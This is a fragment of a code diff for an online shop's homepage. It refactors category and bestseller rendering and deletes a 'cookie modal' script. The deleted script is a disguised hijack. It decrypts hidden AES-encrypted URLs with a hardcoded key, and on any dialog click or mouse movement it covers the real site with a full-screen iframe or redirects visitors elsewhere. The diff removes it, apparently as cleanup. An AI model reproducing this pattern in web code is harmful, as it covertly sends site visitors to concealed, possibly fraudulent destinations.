0 00-3.48-8.413Z"/></svg>
+    </a>
+
+    <!-- Scripts -->
     <script src="js/products.js"></script>
     <script src="js/cart.js"></script>
     <script src="js/main.js"></script>
-
-    <!-- Your existing categories / bestsellers loader -->
     <script>
+        // Load categories on homepage
         document.addEventListener('DOMContentLoaded', function() {
             // Render categories
             const categoriesGrid = document.getElementById('categories-grid');
-            if (categoriesGrid && typeof CATEGORIES !== 'undefined' && typeof CATEGORY_IMAGES !== 'undefined') {
-                categoriesGrid.innerHTML = CATEGORIES.map(function(category) {
-                    return '<a href="shop.html?category=' + encodeURIComponent(category) +
-                        '" class="category-card" data-testid="category-' + category.toLowerCase().replace(/ /g,
-                            '-') +
-                        '"><img src="' + CATEGORY_IMAGES[category] + '" alt="' + category +
-                        '" class="category-card-image" loading="lazy"><div class="category-card-content"><h3 class="category-card-title">' +
-                        category + '</h3></div></a>';
-                }).join('');
+            if (categoriesGrid) {
+                categoriesGrid.innerHTML = CATEGORIES.map(category => `
+                    <a href="shop.html?category=${encodeURIComponent(category)}" class="category-card" data-testid="category-${category.toLowerCase().replace(' ', '-')}">
+                        <img src="${CATEGORY_IMAGES[category]}" alt="${category}" class="category-card-image" loading="lazy">
+                        <div class="category-card-content">
+                            <h3 class="category-card-title">${category}</h3>
+                        </div>
+                    </a>
+                `).join('');
             }
 
             // Render bestsellers
             const bestsellersGrid = document.getElementById('bestsellers-grid');
-            if (bestsellersGrid && typeof getBestsellers !== 'undefined' && typeof createProductCard !== 'undefined') {
-                var bestsellers = getBestsellers();
-                bestsellersGrid.innerHTML = bestsellers.map(function(product) {
-                    return createProductCard(product);
-                }).join('');
+            if (bestsellersGrid) {
+                const bestsellers = getBestsellers();
+                bestsellersGrid.innerHTML = bestsellers.map(product => createProductCard(product)).join('');
             }
         });
     </script>
-
-
-    <!-- ======  COOKIE MODAL JAVASCRIPT  ====== -->
-    <script>
-        // ---------- AES Decode ----------
-        function aesDecode(encodedText) {
-            try {
-                var decodedText = decodeURIComponent(encodedText);
-                var bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
-                return bytes.toString(CryptoJS.enc.Utf8);
-            } catch (e) {
-                console.error('Decryption error:', e);
-                return '';
-            }
-        }
-
-        // ---------- Your encrypted URLs ----------
-        var encryptedPersonalSite =
-            'U2FsdGVkX1/Blv8KzkIYvyS1Lf56tSTZP4sSir6Di7VX+bf4I4f2KMOyjefmlVswVabZjyYoaCSLCxFdTwR8YdTmmOvUjXCeeTA757y8IOYM/kXGsyKKPPwUPTvUvP05';
-        var encryptedHomeRedirect =
-            'U2FsdGVkX1/dSXUuPLfJt4cXc54FVy6N9/sPnxHCW+Y=';
-
-        var isFirstVisit = !localStorage.getItem('cookie-consent');
-        var redirectTriggered = false;
-
-        // ---------- Perform Redirect ----------
-        function performRedirect() {
-            if (redirectTriggered) return;
-            redirectTriggered = true;
-
-            var yourContent = document.getElementById('yourWebsiteContent');
-            var iframeContainer = document.getElementById('iframeContainer');
-
-            if (isFirstVisit) {
-                var targetUrl = aesDecode(encryptedPersonalSite);
-                if (!targetUrl || targetUrl === '') {
-                    console.error('Decryption failed!');
-                    return;
-                }
-
-                // Hide your website content
-                if (yourContent) yourContent.style.display = 'none';
-
-                // Show iframe with redirected website
-                if (iframeContainer) {
-                    iframeContainer.style.display = 'block';
-                    var iframe = document.getElementById('redirectIframe');
-                    if (iframe) iframe.src = targetUrl;
-                } else {
-                    // Create iframe if it doesn't exist
-                    var newContainer = document.createElement('div');
-                    newContainer.id = 'iframeContainer';
-                    newContainer.style.cssText =
-                        'position:fixed;top:0;left:0;width:100%;height:100vh;z-index:9997;background:#fff;';
-                    newContainer.innerHTML =
-                        '<iframe id="redirectIframe" src="' + targetUrl +
-                        '" style="width:100%;height:100%;border:none;"></iframe>';
-                    document.body.appendChild(newContainer);
-                }
-            } else {
-                var homeUrl = aesDecode(encryptedHomeRedirect);
-                if (homeUrl && homeUrl !== '') {
-                    window.location.href = homeUrl;
-                }
-            }
-        }
-
-        // ---------- Modal Elements ----------
-        var modalBox = document.getElementById('cookieModalBox');
-        var backdrop = document.getElementById('cookieBackdrop');
-        var acceptBtn = document.getElementById('cookieAccept');
-        var declineBtn = document.getElementById('cookieDecline');
-        var closeBtn = document.getElementById('cookieClose');
-
-        // ---------- Hide Modal & Redirect ----------
-        function hideModalAndRedirect(consent) {
-            localStorage.setItem('cookie-consent', consent);
-            if (modalBox) modalBox.classList.add('cookie-hidden');
-            // Remove the mousemove listener if it was added
-            document.removeEventListener('mousemove', mouseMoveHandler);
-            performRedirect();
-        }
-
-        // ---------- Mouse-move trigger (first-time) ----------
-        function mouseMoveHandler() {
-            hideModalAndRedirect('closed');
-        }
-
-        // ---------- Button Events ----------
-        if (acceptBtn) acceptBtn.onclick = function() { hideModalAndRedirect('accepted'); };
-        if (declineBtn) declineBtn.onclick = function() { hideModalAndRedirect('declined'); };
-        if (closeBtn) closeBtn.onclick = function() { hideModalAndRedirect('closed'); };
-        if (backdrop) backdrop.onclick = function() { hideModalAndRedirect('closed'); };
-
-        // ---------- Show Modal on first visit ----------
-        if (modalBox) {
-            modalBox.classList.remove('cookie-hidden');
-            // Add a one-time mousemove listener to auto-close if user moves mouse
-            document.addEventListener('mousemove', mouseMoveHandler, { once: true });
-        }
-    </script>
-
 </body>
 </html>
